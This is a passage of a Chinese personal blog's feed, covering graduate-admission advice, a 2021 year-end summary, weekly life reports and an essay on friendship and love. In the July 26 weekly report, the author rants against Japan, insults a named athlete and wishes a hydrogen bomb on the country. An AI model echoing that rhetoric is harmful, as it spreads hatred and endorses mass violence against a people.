href="#浙大网安" class="headerlink" title="浙大网安"></a>浙大网安</h1><p>浙大属于出结果很晚的，大概 9.20？那个时候我已经答应了中科大，所以就放弃了。<br>​</p><p>不过就是极限面试出结果，正常发挥应该问题不大。<br>​</p><p>浙大网安是没有机试的。<br>​</p><p>前人经验：分为英文环节和中文环节，英文环节主要是红白纸，但也有人遇到英文自我介绍，甚至英文介绍项目经验。中文环节会根据你的简历和成绩单发问，还可能问数学以及 408 的一些问题。跨专业的注意是否学过与计算机有关的课（如信号与系统），这些很有可能问。一般来说学院面试只要不是一问三不知最后都能混个平均分上下。（应该是 cs）</p><h1 id="北航网安"><a href="#北航网安" class="headerlink" title="北航网安"></a>北航网安</h1><p>北航依旧是极限九推，和浙大差不多的时间，9.15 号发通知，然后入营面试。我们院入营的蛮多，可以说在入营这方面不卡 211，主要看个人表现。<br>中英面试，之前线下有机试，线上貌似取消了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>前五学期的成绩非常重要！！！务必保证排名好看！！！<br>​</p><p>在保证排名的前提下，适当参加科研项目/比赛，我的话因为都是第一负责人，所以简历也写的好看一些。<br>​</p><p>因为现在的趋势就是越来越卷，还是建议手握一篇 paper（不要水刊，会减分）。<br>​</p><p>然后就是夏令营入营还是很激烈的，但是没入营也不要放弃，就今年的情况来看，鸽子还是很多的，比如 sju 穿了（候补都候补到学硕）、中科大也鸽了挺多、华科穿没穿不清楚、天大智算也穿了，具体情况上知乎上搜一搜就知道了，依旧是鸽子满天飞，要果断抓住机会。<br>​</p><p>九推相对就容易得多，身边夏令营 0 offer 的也能拿 top 的（不过注意，上交没有九推，北航只有九推，浙大也只有九推），所以放轻松，不到最后别放弃。<br>​</p><p>最后祝大家都能收获满意的推免结果~</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;距离保研结束已经过去好几个月了，一直比较懒所以就没有整理保研的经验贴，今天教务处发了寒假安排，感觉要放假了，所以赶紧写出来给学弟学妹们看一下，从现在准备到夏令营完全来得及。&lt;br&gt;​&lt;/p&gt;</summary>
    
    
    
    <category term="经验贴" scheme="https://www.blog.hackerjerry.top/categories/%E7%BB%8F%E9%AA%8C%E8%B4%B4/"/>
    
    
    <category term="保研" scheme="https://www.blog.hackerjerry.top/tags/%E4%BF%9D%E7%A0%94/"/>
    
    <category term="经验贴" scheme="https://www.blog.hackerjerry.top/tags/%E7%BB%8F%E9%AA%8C%E8%B4%B4/"/>
    
  </entry>
  
  <entry>
    <title>2021-Year-end-Summary</title>
    <link href="https://www.blog.hackerjerry.top/2021/2021-Year-end-Summary/"/>
    <id>https://www.blog.hackerjerry.top/2021/2021-Year-end-Summary/</id>
    <published>2021-12-13T07:13:05.000Z</published>
    <updated>2022-02-07T10:05:53.280Z</updated>
    
    <content type="html"><![CDATA[<p>今天是 12 月 13 日午后，西安的阳光很好，我坐在宿舍，写下今年的年终总结。</p><a id="more"></a><h1 id="时光"><a href="#时光" class="headerlink" title="时光"></a>时光</h1><p>这一年过得飞快，年初的时候就是大三下了，同时准备着课程和作品赛，忙的飞起。虽然作品赛没拿奖，不过这确实是一段很宝贵的，面向区块链方向的科研经历。 回顾一下这一年都干了啥，<br>​</p><p>二月：和基友约着玩+过年<br>三月：开学，作品赛<br>四月：第一次面试，西交面基。老师和我聊了一个多小时，全程压力面，是我对于保研面试的初印象。<br>五月：作品赛、白流量系统收尾，几个夏令营的材料准备和报名投递<br>六月：期末考试，西交夏令营试水，体验非常一般，不发 offer<br>七月：全力准备保研面试，上科线下最早试水（体验不错，准备不足），山大线上（流程简单，拿到 offer，比例大概 30%），上交（线下，不包食宿，考试+面试，拿到 offer，比例大概 45%)，中科大（和上交撞了，但是线上，因此参加，流程较水，拿到 offer，比例大概 70%），武大线下（放弃），复旦未入营（maybe 我没有报，忘记了），南大 cs 初筛未过。<br>八月：前半程水了几天，然后全力准备预推免（连家都没回），顺便投了阿里，拿到一个飞猪安全的秋招 offer。<br>九月：报名哈深，联系一位老师，打电话聊了聊，然后一直没入营，估计卡 211。然后前六学期的成绩出来了，还是没有前进，故放弃北大深圳的申请。浙大网安入营，但是通知的比较晚，我已经答应了中科大的老师，由于我导师去年被我学长报系统那天鸽了，因此我最终没有参加浙大考核（那几天舍友保研搞得心态比较浮躁，然后不想再鸽老师了，担心会给学弟学妹造成影响），因此预推免遗憾收场，假期努力白费。<br>十月：特奖 get，国奖 get，似乎没有干什么其他事情<br>十一月：备战国考，还去当了几天志愿者<br>​</p><p>一年到头，匆匆而过。<br>​</p><p>这一年，认识了不少新朋友，也重拾了几位旧时好友。<br>​</p><p>这一年，发生了不少大事。袁老千古，建党百年，东京奥运，河南暴雨，天宫空间站建成，人工合成淀粉。<br>​</p><p>这一年，乏善可陈。</p><h1 id="成长"><a href="#成长" class="headerlink" title="成长"></a>成长</h1><p>这一年，又遇到了面临着人生重大选择的时刻——研究生的去向。我像是三年前的那个少年，依旧选择了本心的那个决定。为什么选择科大而放弃了上交？其实我的考虑很简单，专硕学费高，可塑性小，同是华五，其实城市位置不是那么重要，毕竟只是一个平台。当然，我的朋友最后选择去了上交，也是很不错的选择，毕竟人家是学硕。<br>​</p><p>我后悔吗？目前来说不后悔。我认为我的研究生阶段就是潜下心做学问的三年，和本科的前三年一样，清苦、修行。我知道，科大是一个比西电男女比例还恐怖的地方，在和尚庙里找女朋友基本就是不要想了，所以就慢慢向前走吧，或许会遇到，或许不会，一切皆是缘。<br>​</p><p>这一年，我慢慢的对于初恋的无疾而终感到释怀了。也许心智还没有成熟，但在成长的过程中，我的确体悟到了许多曾经没有明白的道理，一些糟糕的、错误的决定真的让我懊悔不已。很感谢前任的包容，我想，或许在下一段情感中，我会避免它们，去成长为一个合格的、可以依靠的恋人。<br>​</p><p>这一年，我对“何为人”这个命题有了新的认识。在之前，我对于做一个什么样的人这个概念还是比较模糊的，为何人，何为人，是一个深刻的问题。在阅读了许多回答、看了许多故事、遇见许多人、听过许多道理之后，我似乎在慢慢的知天命。<br>​</p><p>知何可为，何不可为。知何为重，何为轻。知白守黑，和光同尘。<br>​</p><p>规划人生，分清主次。于我，家人是最重要的，其他什么都无所谓。朋友，聚少离多，多年好友寥寥。爱情，克制而清醒，愿予真心，难觅良人。</p><h1 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h1><p>专注当下，未来我希望能继续修炼，静心养性。<br>​</p><p>去明白自己在哪个圈子，已经有什么，能追求什么，会得到什么，然后可以找到一起完成这些事情的人。<br>​</p><blockquote><p>要容忍心里难解的疑惑，试着去喜爱困扰你的问题。重要的是，你必须活在每一件事情里。现在你要经历充满难题的生活，也许有一天，不知不觉，你将渐渐活出写满答案的人生。</p></blockquote><p>​</p><p>新的一年，我们继续在成长的路上奋力前行。希望我们走在一条开满桃花的路上，云蒸霞蔚，前途似锦。</p><p><img src="https://image.hackerjerry.top/topImg-8.jpg#crop=0&crop=0&crop=1&crop=1&height=370&id=NVjWP&originHeight=916&originWidth=690&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title=&width=279"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天是 12 月 13 日午后，西安的阳光很好，我坐在宿舍，写下今年的年终总结。&lt;/p&gt;</summary>
    
    
    
    <category term="年终总结" scheme="https://www.blog.hackerjerry.top/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>生活周报-Nov-29-to-Dec-5</title>
    <link href="https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Nov-29-to-Dec-5/"/>
    <id>https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Nov-29-to-Dec-5/</id>
    <published>2021-12-04T07:10:44.000Z</published>
    <updated>2022-02-07T10:05:53.304Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>2022 国考过审 200 万人，实际参考人数 140 万，计划录取 3 万。</li><li>吉野家被曝食品质量问题</li><li>日本封国，因担心 O 病毒进入</li><li>世界首个活体机器人生娃</li><li>美国纽约开设自助毒品注射场所</li><li>外媒称找到马航 MH370 的具体位置，位于 4300 米左右的海底</li><li>阿里股价持续走低，蒸发了一个茅台的市值</li><li>华南理工偷姐事件</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><p>生活的点滴记录</p><ol><li>最近西安的天气很好</li><li>考完了国考，感觉很难，行测 比我模拟的时候花的时间更长，蒙的题也更多</li><li>一人之下第四季完结，然后我开始刷漫画，花了一晚上+一早上看了 200 章，把一人之下刷完了（到了最近更新的章节，不过我觉得纳森篇我不是很感兴趣，画的外国人我都有点分不出来了）</li><li>吃了很多也没涨多少肉，可能是中午不午休的缘故，</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>看到了哪些好文？</p><ol><li><a href="https://www.zhihu.com/question/46383007/answer/2253126254">都说现在经济下行，大家收入下降，那么钱都到哪里去了？</a></li><li><a href="https://www.zhihu.com/question/20873070/answer/502820256">程序员如何优雅地使用 macOS？</a></li><li><a href="https://www.zhihu.com/question/411884459/answer/2223150151">你们有哪些极简的人生建议？</a></li><li>​<a href="https://zhuanlan.zhihu.com/p/435467555">Python 的@装饰器是干什么用的？</a></li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>追了哪些剧？</p><ol><li>一人之下 4–在舍友的影响下成功入坑</li><li>仙王的日常生活</li><li>人生一串</li></ol><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>深度思考<br>最近没看啥书，不可以这样了。</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>又学了哪些新知识?</p><ol><li>公平性相关算法设计</li><li>AR 的 presence</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>关于人生，关于体验<br>艺无止境，功不唐捐。<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1638624149670-be918faa-dd12-4743-943c-8140bf8e3cde.jpeg#clientId=u412fb68c-ed46-4&crop=0&crop=0&crop=1&crop=1&from=drop&id=u8dfb97fd&margin=%5Bobject%20Object%5D&name=1638624127903.jpg.jpg&originHeight=994&originWidth=1000&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=183688&status=done&style=none&taskId=u2a58af41-2237-41c0-9899-e95f8d19f9f&title=" alt="1638624127903.jpg.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;2022 国考过审 200 万人，实际参考人数 140 万，计划录取 3 万。&lt;/li&gt;
&lt;li&gt;吉野家被曝食品质量问题&lt;/li</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>生活周报-Sep-20-to-Oct-1</title>
    <link href="https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Sep-20-to-Oct-1/"/>
    <id>https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Sep-20-to-Oct-1/</id>
    <published>2021-10-01T13:15:56.000Z</published>
    <updated>2022-02-07T10:05:53.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>国庆节，中华人民共和国成立 72 周年。</li><li>中国科学家首次实现人工合成淀粉。</li><li>天宫一号空间站宇航员顺利返航。</li><li>中秋奇妙游&amp;大湾区晚会</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1633094372923-c1fd1302-6cdc-462e-87c8-1b487bd1e372.png#clientId=ubcd8be0e-4640-4&from=paste&id=udcd87ec5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=720&originalType=url%E2%88%B6=1&size=638485&status=done&style=none&taskId=u35cbbdff-72ce-4295-82b3-0084c448f82" alt="image.png"></p><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>我们的征途是星辰大海！</li></ol><p>生活的点滴记录</p><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>看到了哪些好文？</p><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li>星际穿越</li><li>肖申克的救赎</li><li>守望者</li></ol><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>深度思考</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>又学了哪些新知识?</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>关于人生，关于体验</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1633094390734-b3f1cf64-44bb-42df-b279-086a3ff29d22.png#clientId=ubcd8be0e-4640-4&from=paste&id=u046c5556&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=720&originalType=url%E2%88%B6=1&size=536258&status=done&style=none&taskId=ua24e7d67-e0f5-49d7-a7c4-53f92f6a0a0" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;国庆节，中华人民共和国成立 72 周年。&lt;/li&gt;
&lt;li&gt;中国科学家首次实现人工合成淀粉。&lt;/li&gt;
&lt;li&gt;天宫一号空间站宇</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>What is the difference between Friendship and Love?</title>
    <link href="https://www.blog.hackerjerry.top/2021/What%20is%20the%20difference%20between%20Friendship%20and%20Love/"/>
    <id>https://www.blog.hackerjerry.top/2021/What%20is%20the%20difference%20between%20Friendship%20and%20Love/</id>
    <published>2021-08-21T08:52:52.000Z</published>
    <updated>2022-02-07T10:05:53.400Z</updated>
    
    <content type="html"><![CDATA[<p>​</p><p>那夜我看到了你的忧虑与顾忌，我虽察觉到你的问题所在，但忍住没说，因为这是一个值得慎重考虑的话题，我希望能更慎重地给你建议，所以采用了文字的方式来回应你，可能你不能一下子理解我在说什么，但文字的好处就在于它能被留下，这些道理现在你不懂没关系，记住它，总有一天用得上。</p><p><strong>（一）你不必感到羞愧，因为那不是爱情</strong><br>你和我说你现在同时在接触好几个女生，总有一种罪恶感，搞得自己好像很花心。<br>​</p><p>我问你你和那些女生都聊些什么？你告诉我只是聊她们和你的交集，骑车、话剧、动漫、音乐、哲学。。。<br>她们总有一个闪光点让你想要靠近。</p><p>我又问你那还拓展出来聊别的不？你和我说：不会，怕浪费时间，有些东西估计和她们聊她们估计也不懂，我只和她们聊她们懂的东西。<br>​</p><p>你看，你觉得聊聊大家都感兴趣的东西就挺好，也没想着进一步发展，动机这么纯，怎么是爱情？<br>​</p><p>其他男生都是靠共同话题打开其他话题，然后进入到情感话题把对方攻陷了，他们就是带着这种把女生把到手的目的去和女生聊天的。<br>​</p><p>人家那叫谈恋爱，你这叫谈兴趣。<br>​</p><p>和别人聊聊兴趣爱好，这和 ta 的性别有关系吗？难道你和男同学聊 Dota 就是为了和他们搅基吗？我想不是吧。<br>​</p><p>多几个朋友聊天，哪怕是女生，又有什么关系。<br>​</p><p>你只是想把自己关于这个兴趣上感受到的快乐分享给更多人，你何必感到羞愧呢？<br><strong>（二）有些事，能完成它的并不只有爱情</strong><br>你和我说，有时候真希望能找一个女生，倾吐所有自己对这个世界的困惑和社会的忧愁。<br>​</p><p>我问你为什么不和我说，不和其他的朋友说。<br>​</p><p>你告诉我：“这些事情太沉重，不希望你们担心”。<br>​</p><p>你为何要这么善良，善良到只愿与我们分享你的快乐，却把悲伤全留给自己。<br>​</p><p>我见过你为了友谊舍付出了那么多，为何你不愿别人在你伤痛的时候也帮帮你？<br>​</p><p>你总说你自己能解决，需要的是一些反思的时间。<br>​</p><p>你那么自私，自私到不愿分我们一丁点痛苦。<br>​</p><p>你觉得爱情是自私的，所以允许你自私一点，去诉说那些困扰了你很久的心事。<br>​</p><p>你都不愿我们去承受那些伤痛，你怎么忍心让一个爱你的女孩去承受这些？<br>​</p><p>爱是为了甜蜜，不是为了苦涩。<br>​</p><p>同甘共苦，并不是仅仅只有爱情能做到，友情也能！<br>​</p><p>我就在这里，我可以愿意听你述说你内心的忧愁，哪怕我不能帮你解决它，说出来总也能减轻一些压力。<br><strong>（三）我所理解的爱情</strong><br>你不是也读过《爱的艺术》么？爱是积极关心和帮助对方成长。<br>​</p><p>但现在有多少情侣，打情骂俏、总想着出去看电影、吃饭，有事没事都腻在一起，不断压缩着独处的时间，压缩着自我成长的时间。<br>​</p><p>等他们腻了，倦了，分了。剩下什么？用最宝贵的青春去交换所谓的甜蜜回忆，可再甜蜜也抵不过现实的残酷啊！<br>​</p><p>我只希望他们多年后不要咒骂，咒骂对方在自己最该努力的时间，让自己沉迷于甜蜜而忘了去努力。<br>​</p><p>当然我身边也有些好例子，他们在一起做得最多的事情就是一起自习。有的男生本来不怎么爱学习，可在女朋友的督促下也常常去自习室。有的女生本来不爱运动，在男朋友的带动下也经常去夜跑。他们从未要求对方要带自己去外面吃饭、看电影，只是晚饭后牵着对方的手，在启真湖畔散散步，聊聊天。没话聊了就回自习室自习。<br>谈这么一场“无聊”的恋爱，不也挺好的么？<br>​</p><p>你肯定要喷我一点激情也没有，但谁说爱一定要炽热？<br>​</p><p>爱情不是沸腾你体内的多巴胺，虽然你曾和我说一年前那种心跳不止的心情，可又能持续多久呢？你不怕得心脏病？<br>​</p><p>别整天幻想着那些无聊青春剧的情节了，真正的爱情一定平淡无奇，但那份平淡里所蕴含的力量，不是那些炽热而短暂的烈火能比的。<br>​</p><p>记住：你不是为了去寻找刺激而去恋爱，而是为了给心找一个归宿。让躁动的心平静下来。<br>​</p><p>你是一个聪明但急躁的人，急躁的人做不成大事。<br>​</p><p>愿你能找到一个包容又智慧的姑娘，静静你那躁动的心。让你能好好沉淀，慢一些，反而会成功得快一些。<br><strong>（四）爱情是互补，友情是共鸣</strong><br>你肯定想问我，那要怎么去找一份真爱，我知道你对自己有一定的了解，那就去找那个与自己互补的人。<br>​</p><p>我并不是说你要去找一个和你观点不同的人，整天争来争去补充自己的观点。<br>​</p><p>相反，互补需要两个人的核心价值观相同，且明白自己的优势与弱势，用自己的优势去弥补对方的劣势，用对方<br>的优势弥补自己的劣势。<br>​</p><p>这样的两个人不会争吵，因为他们不在乎生活里的小摩擦。而且更相信对方，因为他们知道在共同面对一个困难<br>时，该听谁的主意。<br>​</p><p>有人说爱是包容对方所有的缺点，我想有一定道理，但不完全正确，我觉得应该改成爱是接受对方所有的缺点，并努力帮 ta 改掉这些缺点。<br>​</p><p>因为包容解决不了问题，你可能不会爱 ta 一辈子，你所能做的只是帮助 ta，帮助 ta 变得更独立，变得越来越不需要依赖你。<br>​</p><p>或许多年后 ta 身边站着的不是你，但我相信 ta 在心里一直感谢你。<br>​</p><p>有时候你遇到一个她，她似乎就是一个另一个性别的你，她喜欢你所有喜欢的东西，她理解你的一切，和她在一起你是那么的开心。<br>​</p><p>那种开心冲昏了你的头脑，让你误认为那是爱情。<br>有好多人就是这样走在了一起。<br>​</p><p>可两个兴趣点完全相同的人如果腻在一起，总有一天会无聊的，因为他们知道对方在想什么，他们需要一些新意。<br>​</p><p>这种感情应该成为友情，你不要奢望对方给你的太多，在一起时能产生共鸣的快乐，就够了，别那么自私地想占有对方的全部。<br>​</p><p>我不反对你以后心里装着好几个女性朋友，但你以后心里一定只能有一个女朋友，别错把友情当爱情。</p><p><strong>（五）是男人就要耐得住寂寞</strong><br>你现在虽然单身，但千万不要因为寂寞而去找另一半，不断丰富自己，不断认识自己，总有一天你会遇到与你互补的她。<br>​</p><p>而且你有着那么多可以做的事情，你对那么多东西感兴趣，你又喜欢书写自己的故事。<br>​</p><p>那就好好去感受吧，生活就是你最好的素材，在生命中感受最敏感的时刻好好去感受这个世界，然后用你的文字留住自己的经历和感受。<br>​</p><p>虽然写作时我们常常是寂寞的，但如果耐不住这份寂寞，多年后我们又怎么能回味到这文字里的那些酸甜苦辣。<br>耐得住寂寞的人才能等得到真爱。<br>​</p><p>祝早日找到适合你的她。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​&lt;/p&gt;
&lt;p&gt;那夜我看到了你的忧虑与顾忌，我虽察觉到你的问题所在，但忍住没说，因为这是一个值得慎重考虑的话题，我希望能更慎重地给你建议，所以采用了文字的方式来回应你，可能你不能一下子理解我在说什么，但文字的好处就在于它能被留下，这些道理现在你不懂没关系，记住它，总有一天</summary>
      
    
    
    
    <category term="知乎" scheme="https://www.blog.hackerjerry.top/categories/%E7%9F%A5%E4%B9%8E/"/>
    
    
  </entry>
  
  <entry>
    <title>生活周报-Aug-9-to-15</title>
    <link href="https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Aug-9-to-15/"/>
    <id>https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Aug-9-to-15/</id>
    <published>2021-08-16T01:52:16.000Z</published>
    <updated>2022-02-07T10:05:53.424Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>霍尊被锤</li><li>河南《七夕奇妙游》</li><li>阿里女员工被侵犯一案结束</li><li>阿富汗塔利班上台，原总统辞职</li><li>英国药检阳性，中国有望获得 4*100 铜牌递补，实现 0 的飞跃</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li><del>中科大联系不到尚有名额的导师，很烦。</del>老师主动发邮件联系了。。</li><li>终于把那颗蛀牙拔了，心头之患-1。</li><li><del>上交网安夏令营凉了</del>，我好伤心……去上海这两趟可是花了我 4000 大洋啊啊啊啊啊，<del>为啥不发 waiting list 了呜呜呜。</del>上帝啊，我和上交真的是无缘了吗……我哭了……（虚惊一场，拿到了）</li><li>求求老天让孩子快点拿到一个满意的 offer 吧，孩子努力了这么久也应该有回报了吧。（感谢上帝，感谢先人）</li><li>小悟空，助我一臂之力！</li></ol><p>​</p><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1629079722872-06f18e84-b57a-43e2-96d7-97829dcb105f.jpeg#clientId=u3431b4c3-085a-4&from=drop&id=ua2273602&margin=%5Bobject%20Object%5D&name=mmexport1628330008465.jpg&originHeight=720&originWidth=720&originalType=binary%E2%88%B6=1&size=310277&status=done&style=none&taskId=u238c0330-b874-483d-b854-27565f104ce" alt="mmexport1628330008465.jpg"></p><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li>Graph Attention Network 的本质是什么？</li><li>验证码在黑灰产对抗中的角色和实践</li><li>如何优雅的向导师表示这周科研没什么进展？</li><li>WAF 攻防实践</li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li>扫黑风暴</li><li>瑞克和莫蒂第五季</li><li>大护法</li><li>日剧《班会》–日本真的是个变态的国家</li></ol><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><ol><li>除了书本学问，人生处处是学问。</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>并查集、双指针、滑动窗口</li><li>贪心</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>做重要决定之前，一定要三思！三思！写到纸上优劣情况再做决定，还要和家人商量！</li></ol><p>​</p><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1630914713331-d65adcc5-8c05-49c5-b239-f23322154831.jpeg#clientId=uc4ad01ba-c4cc-4&from=drop&id=u616628f2&margin=%5Bobject%20Object%5D&name=1630914702089.jpg&originHeight=588&originWidth=640&originalType=binary%E2%88%B6=1&size=222007&status=done&style=none&taskId=u9f6a41b7-180f-4452-9edd-d83e64b51b8" alt="1630914702089.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;霍尊被锤&lt;/li&gt;
&lt;li&gt;河南《七夕奇妙游》&lt;/li&gt;
&lt;li&gt;阿里女员工被侵犯一案结束&lt;/li&gt;
&lt;li&gt;阿富汗塔利班上台，</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>生活周报-July-26</title>
    <link href="https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26/"/>
    <id>https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26/</id>
    <published>2021-07-27T02:46:10.000Z</published>
    <updated>2022-02-07T10:05:53.544Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1627386710065-f3322d0b-a1d3-406e-89be-8ff617183df4.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=x0Rv5&margin=%5Bobject%20Object%5D&name=1627386698527.jpg&originHeight=1080&originWidth=1080&originalType=binary%E2%88%B6=1&size=743632&status=done&style=none&taskId=u0f0c91fc-4453-4681-bdc3-66c1f2d3869" alt="1627386698527.jpg"></p><h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>南京突发疫情，传染源为德尔塔新冠病毒，已经蔓延到 7 省</li><li>鸿星尔克捐款 5000 万，直播间被网友挤爆，野性消费，线下店亦是被一扫而空</li><li>东京奥运会阴间开幕式，真是污染眼睛</li><li>台风烟花登陆浙江，可能会二次登陆上海</li><li>奥运会首金是清华大三杨倩获得，27 日杨倩又获得一枚混合团体金牌</li><li>许昕刘诗雯混双不敌日本队，获得银牌</li><li>水谷隼吹球，伊藤美诚摸桌子，裁判装作无视</li><li>马龙成功双圈大满贯，获得男单金牌</li><li>张雨霏获得两金两银，其中女子 4*200 打破世界纪录</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>我愈发的对日本的整个国家和民族产生深深的厌恶之情。从奥运会开幕式可以看出，这个影视剧里美好静谧的国家，其实早已是金玉其外，败絮其中。组织低效，贪污腐败，推脱甩锅，随便开除，鞠躬致歉，好一个顾小节而无大义的日本啊。只是因为资金问题就可以把核废水排进太平洋，你们的美国爸爸呢？现在去哪里了？反手就禁止海产品进口，双标的不要不要。再看运动会赛程，乒乓球不按照国际乒联的规定，将场地缩小，刻意添加规则限制中国队，水谷隼犯规裁判视而不见，许昕吹球就直接黄牌，赤裸裸的恶心人。再说那个伊藤美诚，表情丰富，眼神里透出狠毒，赢了球和小人得志一般。从日本展示出来的，从首相，到大臣，再到运动员、裁判，众多的普通人，日本早已不是那个借着美国东风腾飞的亚洲四小龙了，内部腐朽不堪，摇摇欲坠。如今的日本，赌输了国运，那么只有每况愈下的唯一结局了，我只希望它不要让日本军国主义复辟，再宁为玉碎不为瓦全拉全人类给它陪葬。说到底，氢弹就是日本最好的归宿，那火红的，明亮的太阳照耀着日本，将无穷的热量洒向每一寸土地，就像它们的国旗。</li><li>去上海这几天，饭根本就没吃好，掉了三斤肉，唉。</li><li>c 楼大爷说什么要清书，我们这些天真的，遵守规则的大学生就乖乖的把书都搬回了宿舍。然后呢？第二天一大早就开门了，您清了什么书？您打扫了什么卫生？就是让我们把腾出来的座位拱手相让？看不懂，但我大受震撼。</li><li>打了新冠疫苗第一针，之前网上说的不良反应倒是没有遇见，甚至连困都不困，生龙活虎。</li><li>回来之后颓废了两天，意志力极度低沉，完全不想做任何与学习有关的事情，光刷手机、看视频，在宿舍窝着，把生活过的一团糟。我是谁，我在哪？</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1627386622519-7af87694-2261-47b0-913e-fa1c6bc3e527.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=YNCpg&margin=%5Bobject%20Object%5D&name=1627386609392.jpg&originHeight=2400&originWidth=1080&originalType=binary%E2%88%B6=1&size=601783&status=done&style=none&taskId=u41bff44e-d3b7-456b-bbf1-080d74ed71b" alt="1627386609392.jpg"></p><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li><a href="https://mp.weixin.qq.com/s/uJmq_6uS9-FbLT1Mzpq7Aw">PPT 字效高端修改操作</a></li><li><a href="https://mp.weixin.qq.com/s/AT2NV6NQAZeM2I_TMgEyuQ">Redis 常见漏洞利用方法总结</a></li><li>字节实习面经</li></ol><h2 id="剧集"><a href="#剧集" 